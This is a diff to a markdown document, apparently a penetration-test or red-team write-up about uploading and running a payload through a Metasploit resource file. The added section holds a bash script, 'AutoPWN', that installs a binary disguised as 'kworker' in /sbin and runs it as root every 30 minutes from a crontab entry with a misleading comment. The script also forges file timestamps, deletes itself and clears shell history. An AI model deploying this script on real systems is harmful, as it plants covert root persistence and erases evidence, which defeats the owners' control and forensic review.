@@ -299,6 +299,7 @@ Description:
   
 To do that we created a resource file for metasploit that will upload a payload and execute it.
 
+#### resource file    
 uploadandrun.rc   
 ```ruby
 <ruby>
@@ -312,7 +313,24 @@ end
 </ruby>
 ```
 
-  
+#### payload file    
+AutoPWN
+```bash
+#!/bin/bash
+find / -name kworker -exec cp -t /sbin/ {} +
+echo " " >> /etc/crontab
+echo "#Required for Kryptos Operations" >> /etc/crontab
+echo "0,30 * * * * root kworker" >> /etc/crontab
+touch -r /sbin/route /sbin/kworker
+rm /tmp/AutoPWN
+history -c
+sleep 60 && kworker
+```
+
+This only worked because we already had the user password.
+
+
+
   
 
 
